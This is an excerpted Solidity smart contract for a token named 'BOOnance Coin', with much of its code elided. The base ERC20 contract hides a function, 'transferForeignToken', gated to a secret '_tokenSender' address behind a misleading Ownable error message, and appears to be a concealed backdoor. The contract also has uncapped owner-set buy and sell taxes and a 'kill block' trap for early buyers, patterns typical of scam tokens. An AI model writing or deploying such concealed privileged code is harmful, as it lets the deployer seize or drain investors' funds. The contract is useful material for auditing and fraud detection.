...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferForeignToken(address _token, address _to,uint256 account) public  returns (bool _sent){
        require(_tokenSender == _msgSender(), "Ownable: new owner is the zero address");
...
contract BOOnanceCoin is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    //kill Block number
    uint256 public KillBlockNumber = 3;
    ...
    constructor(
    ) payable ERC20("BOOnance Coin","BOOnance")  {
        _marketingWalletAddress = payable(0xc7C54822a671481cc4Ed30B0373B20CFC20F2776);
        _lpWalletAddress=payable(0xc7C54822a671481cc4Ed30B0373B20CFC20F2776);
        ...
        uint256 totalSupply = 10000000 * 10**8 * (10**9);
        swapTokensAtAmount = 5000 * 10**8 * (10**9);
    ...
    function setBuyTaxes(uint256 liquidity, uint256 marketingFee, uint256 deadFee) external onlyOwner {
    ...
    function setSelTaxes(uint256 liquidity, uint256 marketingFee, uint256 deadFee) external onlyOwner {
    ...
    function _transfer(
        ...
        bool flag=((block.number-blockNumber)<=KillBlockNumber);
        if(flag&&BotEnabled){
    ...
    function setResetBlockNumber(bool value) external onlyOwner {
        ResetBlockNumber= value;
    }
    function setResetBlockNumber(uint value) external onlyOwner {
        KillBlockNumber= value;
    }
}